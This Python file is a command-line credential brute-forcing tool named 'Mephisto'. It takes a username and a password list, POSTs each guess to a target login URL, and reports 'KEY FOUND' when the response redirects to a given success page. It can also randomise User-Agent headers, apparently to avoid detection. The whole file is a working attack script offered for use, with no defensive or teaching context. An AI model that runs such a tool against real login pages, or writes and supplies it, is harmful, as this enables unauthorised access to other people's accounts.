import requests
from fake_useragent import UserAgent
import argparse

def brute_force_attack(username, password_list, url, success_url, port, random_agent):
    ua = UserAgent()
    headers = {'User-Agent': ua.random} if random_agent else {'User-Agent': 'Mozilla/5.0'}

    for password in password_list:
        print(f"Attempting with password: {password}")

        data = {
            'username': username,
            'password': password
        }

        try:
            response = requests.post(url, data=data, headers=headers, timeout=10)

            # Check if redirected to success URL
            if response.history and response.url == success_url:
                print(f"KEY FOUND: {password}")
                break
            else:
                print("Failed attempt with password: " + password)
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue
    else:
        # If the loop completes without finding the key
        print("KEY NOT FOUND")

def main():
    parser = argparse.ArgumentParser(description="Mephisto Brute Force Tool")
    parser.add_argument('-l', '--username', type=str, required=True, help="Target username")
    parser.add_argument('-P', '--password', type=str, required=True, help="Path to password list file")
    parser.add_argument('url', type=str, help="Target login URL")
    parser.add_argument('--redirect', type=str, required=True, help="Success URL (redirect to this URL when successful)")
    parser.add_argument('--port', type=int, required=True, help="Port of the target server")
    parser.add_argument('--random-agent', action='store_true', help="Use random User-Agent headers")

    args = parser.parse_args()

    # Read password list
    try:
        with open(args.password, 'r') as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("Password list file not found.")
        return

    brute_force_attack(args.username, password_list, args.url, args.redirect, args.port, args.random_agent)

if __name__ == "__main__":
    main()
